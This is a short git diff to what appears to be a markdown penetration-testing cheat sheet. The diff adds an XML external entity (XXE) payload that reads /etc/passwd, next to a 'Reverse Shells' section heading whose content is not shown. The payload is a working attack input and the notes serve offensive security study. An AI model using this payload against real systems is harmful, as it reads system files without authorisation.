@@ -47,6 +47,14 @@ Check out previous commit:
 git checkout 123456789
 ```
 
+
+XML XXE:
+```
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
+
 ## Reverse Shells:
 + <b>Listen for ping (ICMP echo)</b>
 ``` console
